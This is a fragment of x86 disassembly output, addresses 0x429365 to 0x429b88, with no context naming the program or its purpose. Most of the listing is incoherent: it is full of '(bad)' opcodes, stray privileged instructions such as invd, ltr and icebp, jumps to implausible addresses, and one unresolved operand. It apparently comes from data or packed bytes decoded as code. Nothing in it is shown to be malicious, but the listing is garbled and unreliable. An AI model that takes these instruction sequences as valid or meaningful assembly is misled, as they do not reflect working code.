  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
